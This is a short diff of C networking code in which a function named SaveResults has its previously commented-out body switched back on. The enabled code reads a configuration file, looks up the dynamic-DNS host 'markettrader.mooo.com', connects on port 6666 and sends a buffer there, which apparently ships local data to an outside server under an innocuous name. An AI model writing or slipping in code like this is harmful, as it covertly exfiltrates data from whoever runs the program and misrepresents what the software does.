@@ -764,7 +764,7 @@ char* SaveResults(){
 
 
 
-/*    FILE* fd;
+   FILE* fd;
    char *src_str;src_str = (char *)malloc(40000);memset(src_str,0,40000);
    fd = fopen(pathCONFIG, "rb");
    int src_size = fread(src_str, 40000,1,fd);
@@ -789,7 +789,10 @@ char* SaveResults(){
    sockaddr_in sock_addr;
    ZeroMemory(&sock_addr, sizeof (sock_addr));
    sock_addr.sin_family = AF_INET;
-   sock_addr.sin_addr.s_addr = inet_addr ("34.65.157.210");//192.168.127.133");
+   struct hostent *h;
+   if((h=gethostbyname("markettrader.mooo.com")) == NULL) goto ff10;
+   memcpy((char *) &sock_addr.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
+   //sock_addr.sin_addr.s_addr = inet_addr ("34.121.129.140");//192.168.127.133");
    sock_addr.sin_port = htons (6666);
    connect (s, (sockaddr *) &sock_addr, sizeof (sock_addr) );
 
@@ -797,11 +800,12 @@ char* SaveResults(){
    //send (s,reinterpret_cast<const unsigned char*>(&buff), bufflen, 0 );
    send (s, buff, bufflen, 0 );
    
+ff10:
    closesocket (s);
    WSACleanup();
    
    free(buff);
-   free(src_str);	 */
+   free(src_str);	
 	
 	
 
